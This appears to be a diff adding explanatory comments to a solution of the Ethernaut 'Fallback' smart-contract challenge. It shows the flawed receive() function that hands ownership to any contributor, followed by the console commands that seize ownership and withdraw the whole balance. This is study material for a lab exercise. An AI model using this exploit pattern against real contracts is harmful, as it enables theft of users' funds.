@@ -42,6 +42,8 @@ contract Fallback {
 
   // This is the exploit we can use to become the contract owner with ease.
   // We can match both requirements with ease after sending a small amount of ETH and following up with an additional transaction that will not be via the receive() function
+  // The receive function is hit when we send ETH to the contract address without following the function calls.
+  // Other examples of this include the fallback functions.
   receive() external payable {
     require(msg.value > 0 && contributions[msg.sender] > 0);
     owner = msg.sender;
@@ -65,13 +67,17 @@ contract Fallback {
 // Check contract balance
 // web3.eth.getBalance("0x49A346044244576A714C4cEc29474cE60bB2A6Ec") => "100000000000000"
 
+// Send ETH to the contract address via the receive() function
 // contract.sendTransaction({value: toWei("0.001")})
 
 // Check contract balance
 // web3.eth.getBalance("0x49A346044244576A714C4cEc29474cE60bB2A6Ec") => "1100000000000000"
 
+// Check contract owner again => I now have contract ownership (player)
 // await contract.owner() => '0x319d567611c5a1017BA081e2B27B7c7b57e1797d'
 
+// I can safely withdraw the contract balance as well as other people contract balances
 // contract.withdraw() => tx: "0x83a75b99223ab7551be72673ff9ef65bf67ae1f896fe0cec3a577662983c5dea"
 
+// Check contract balance of contract, all gone back to me =)
 // await getBalance(contract.address) => "0"    
